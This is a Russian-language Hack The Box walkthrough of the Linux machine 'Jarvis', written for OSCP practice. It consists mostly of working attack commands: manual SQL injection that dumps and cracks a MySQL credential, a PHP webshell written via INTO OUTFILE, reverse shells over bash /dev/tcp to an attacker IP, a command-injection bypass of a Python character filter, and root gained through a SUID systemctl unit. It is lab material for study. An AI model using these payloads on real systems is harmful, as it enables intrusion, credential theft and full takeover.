# Jarvis (HTB)

> Платформа: Hack The Box  
> ОС: Linux  
> Сложность: Medium  
> Результат: root

---

## Attack Chain

```text
Reconnaissance
├── nmap -sC -sV -p- jarvis.htb → 22 (SSH), 80 (Apache "Stark Hotel"), 64999 (Apache + fail2ban)
├── gobuster → /phpmyadmin/, /images/, /js/, /css/, /fonts/
└── /rooms-suites.php → ссылки /room.php?cod=N

SQL Injection (manual, no sqlmap)
├── Boolean-based: cod=1 AND 1=1 (6204 b) vs cod=1 AND 1=2 (5916 b)
├── ORDER BY 1..7 → работает, ORDER BY 8 → ошибка → 7 колонок
├── UNION SELECT: cod=-1 UNION SELECT 1,version(),3,4,5,6,7 → MariaDB 10.1.48
├── Дамп БД: information_schema.schemata → hotel, mysql, information_schema
├── Дамп mysql.user: DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
├── File_priv=Y, secure_file_priv='' → запись файлов разрешена
└── hashcat -m 300 → imissyou

Foothold (RCE via INTO OUTFILE)
├── LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf') → DocumentRoot: /var/www/html
├── INTO OUTFILE '/var/www/html/x.php' с hex от <?php system($_GET['x']); ?>
├── curl x.php?x=id → uid=33(www-data)
└── Reverse shell через bash + /dev/tcp → www-data

Lateral Movement (www-data → pepper)
├── sudo -l → (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
├── simpler.py: forbidden = ['&', ';', '-', '`', '||', '|']
├── Обход через $() — command substitution не заблокирован
├── /tmp/shell.sh: bash -c "bash -i >& /dev/tcp/10.10.14.177/4445 0>&1"
├── sudo -u pepper simpler.py -p → Enter an IP: $(/tmp/shell.sh)
└── Shell от pepper → user.txt

Privilege Escalation (pepper → root)
├── find / -perm -4000 → /bin/systemctl (SUID root:pepper)
├── cat /home/pepper/root.service (Type=oneshot, ExecStart=bash reverse shell)
├── /bin/systemctl link /home/pepper/root.service
├── /bin/systemctl start root.service
└── Root shell → cat /root/root.txt
```

---

## Machine Briefing

Apache 2.4.25 (Debian) на порту 80 с сайтом "Stark Hotel" и дополнительный Apache на порту 64999 (с fail2ban). SQL-инъекция в `room.php?cod=` позволяет писать файлы через `INTO OUTFILE`, что даёт webshell. Далее — command injection в `simpler.py` для перехода на `pepper` и SUID `systemctl` для root.

---

## Reconnaissance

### Port Scan

```bash
nmap -p- --min-rate=5000 --max-retries 1 --defeat-rst-ratelimit -T4 -Pn -n jarvis.htb -oA scans/quick
nmap -sC -sV -Pn -n --open -p 22,80,64999 jarvis.htb -oA scans/detail
```

| Порт  | Сервис | Версия                              |
|-------|--------|-------------------------------------|
| 22    | SSH    | OpenSSH 7.4p1 Debian 10+deb9u6      |
| 80    | HTTP   | Apache httpd 2.4.25 (Debian) — Stark Hotel |
| 64999 | HTTP   | Apache httpd 2.4.25 (Debian) — fail2ban |

Порт 64999 защищён fail2ban — при частых запросах блокирует IP на 90 секунд. **Не трогаем его**, чтобы не потерять доступ.

### Directory Enumeration

```bash
gobuster dir -u http://jarvis.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

| Путь           | Статус |
|----------------|--------|
| /phpmyadmin    | 301    |
| /images        | 301    |
| /js            | 301    |
| /css           | 301    |
| /fonts         | 301    |
| /server-status | 403    |

---

## Foothold (SQL Injection)

### Подтверждение инъекции

```bash
curl -s -G "http://jarvis.htb/room.php" --data-urlencode "cod=1" | wc -c
# 6204

curl -s -G "http://jarvis.htb/room.php" --data-urlencode "cod=1 AND 1=1" | wc -c
# 6204

curl -s -G "http://jarvis.htb/room.php" --data-urlencode "cod=1 AND 1=2" | wc -c
# 5916 — разница → boolean-based SQLi
```

**Ключевой момент:** используем `-G` + `--data-urlencode`, чтобы curl корректно кодировал пробелы (`%20`), `;` (`%3B`), `+` (`%2B`). Без этого payload обрезается.

### Определение количества колонок

```bash
for i in 1 5 7 8 9; do
  size=$(curl -s -G "http://jarvis.htb/room.php" --data-urlencode "cod=1 ORDER BY $i" | wc -c)
  echo "ORDER BY $i → $size bytes"
done
```

- `ORDER BY 1..7` → 6204 байт (успех)
- `ORDER BY 8` → 5916 байт (ошибка)

**Вывод: 7 колонок.**

### UNION SELECT

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,CONCAT('START',version(),'END'),3,4,5,6,7-- -" \
  | grep -oE "START.*END"
```

**Результат:** `START10.1.48-MariaDB-0+deb9u2END`.

### Дамп баз данных

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,GROUP_CONCAT(schema_name),3,4,5,6,7 FROM information_schema.schemata-- -" \
  | grep -oE "hotel|information_schema|mysql|performance_schema" | sort -u
```

### Креды MySQL

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,CONCAT(User,':',Password),3,4,5,6,7 FROM mysql.user WHERE User='DBadmin'-- -" \
  | grep -oE "DBadmin:\*[A-F0-9]+"
```

**Результат:**

```
DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
```

### Крек MySQL-хеша

```bash
echo '*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0' > hash.txt
hashcat -m 300 hash.txt /usr/share/wordlists/rockyou.txt
```

**Результат:** `imissyou`.

### Проверка FILE privilege

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,CONCAT('F:',File_priv,':E'),3,4,5,6,7 FROM mysql.user WHERE User='DBadmin'-- -"
```

**Результат:** `F:Y:E` — FILE privilege есть.

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,CONCAT('SEC:',@@secure_file_priv,':END'),3,4,5,6,7-- -"
```

**Результат:** `SEC::END` — `secure_file_priv` пустой, можно писать куда угодно.

---

## Exploitation (RCE via INTO OUTFILE)

### Определение web-root

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),3,4,5,6,7-- -"
```

В ответе: `DocumentRoot /var/www/html`.

### Тест записи файла

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 0x3c3f706870206563686f202848656c6c6f576f726c64293b203f3e,2,3,4,5,6,7 INTO OUTFILE '/var/www/html/test.php'-- -"

curl "http://jarvis.htb/test.php"
# HelloWorld    2    3    4    5    6    7
```

`INTO OUTFILE` **не перезаписывает существующий файл**. Если нужно записать новый — используй другое имя.

### Webshell

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2778275d293b203f3e,2,3,4,5,6,7 INTO OUTFILE '/var/www/html/x.php'-- -"
```

Hex `3c3f7068702073797374656d28245f4745545b2778275d293b203f3e` = `<?php system($_GET['x']); ?>`.

Проверка:

```bash
curl "http://jarvis.htb/x.php?x=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse shell

```bash
# Kali
echo -n 'bash -i >& /dev/tcp/10.10.14.177/4444 0>&1' | base64 -w0
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzcvNDQ0NCAwPiYx

# Listener
nc -lvnp 4444

# Отправка через webshell (GET-параметр, + для пробелов, %2B для +)
curl -s "http://jarvis.htb/x.php?x=echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNzcvNDQ0NCAwPiYx+%7C+base64+-d+%7C+bash"
```

**Важно:** в URL `+` нужно кодировать как `%2B`, иначе сервер примет его за пробел и base64 сломается.

### Stabilize

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Lateral Movement (www-data → pepper)

### Enumeration

```bash
sudo -l
```

```
User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

### Анализ simpler.py

```bash
cat /var/www/Admin-Utilities/simpler.py
```

```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

**Ключевое:** фильтр запрещает `&`, `;`, `-`, `` ` ``, `||`, `|`, но **не запрещает `$`, `(`, `)`**. Значит, можно использовать `$()` — command substitution.

**Важный нюанс:** `os.system` вызывает `/bin/sh -c "..."` — на Debian это **dash**, а не bash. Dash **не понимает `>&`** — выдаёт `Bad fd number`. Поэтому внутри файла-скрипта нужна обёртка `bash -c "..."` (с **двойными** кавычками, чтобы dash передал содержимое bash без своей интерпретации).

### Подготовка скрипта

```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.177/4445 0>&1"' > /tmp/shell.sh
chmod +x /tmp/shell.sh
cat /tmp/shell.sh
# bash -c "bash -i >& /dev/tcp/10.10.14.177/4445 0>&1"
```

### Listener

```bash
nc -lvnp 4445
```

### Exploit

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
# Enter an IP: $(/tmp/shell.sh)
```

**Shell от `pepper`.**

### Stabilize

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### User flag

```bash
cat /home/pepper/user.txt
# <USER_FLAG>
```

---

## Privilege Escalation (pepper → root)

### Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null | grep systemctl
ls -la /bin/systemctl
```

**Результат:**

```
-rwsr-x--- 1 root pepper 174520 Jun 29  2022 /bin/systemctl
```

SUID установлен, владелец `root`, группа `pepper` — значит `pepper` может запускать `systemctl` **с правами root**.

### Создание вредоносного unit

```bash
cat > /home/pepper/root.service << 'EOF'
[Unit]
Description=Root Shell

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.177/4445 0>&1'

[Install]
WantedBy=multi-user.target
EOF
```

### Listener (второй терминал)

```bash
nc -lvnp 4445
```

### Exploit

```bash
/bin/systemctl link /home/pepper/root.service
# Created symlink /etc/systemd/system/root.service -> /home/pepper/root.service.

/bin/systemctl start root.service
```

`systemctl link` — легальная команда, которая позволяет подключать unit-файл из любого места, а не только из `/etc/systemd/system/`. Через SUID `systemctl` мы подключаем наш unit и запускаем его от root.

### Root shell

```bash
root@jarvis:/# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root flag

```bash
cd /root
cat /root/root.txt
# <ROOT_FLAG>
```

---

## Flags

| Флаг | Значение                         |
|------|----------------------------------|
| User | <USER_FLAG> |
| Root | <ROOT_FLAG> |

---

## Key Takeaways

- **Ручная SQLi без sqlmap** — boolean-based, ORDER BY, UNION SELECT. На экзамене OSCP sqlmap запрещён, всё делается руками.
- **`INTO OUTFILE` не перезаписывает файл** — при повторной записи с тем же именем MariaDB вернёт ошибку. Используй новое имя.
- **`os.system` в Python вызывает `sh` (dash), а не bash** — `>&` не работает; нужна обёртка `bash -c "..."` с двойными кавычками.
- **Фильтры часто неполные** — `forbidden = ['&', ';', '-', '`', '||', '|']` пропускает `$()`, что открывает command injection.
- **SUID `systemctl`** — классика GTFOBins. `link` позволяет подключать unit из любого места, `start` запускает его от root.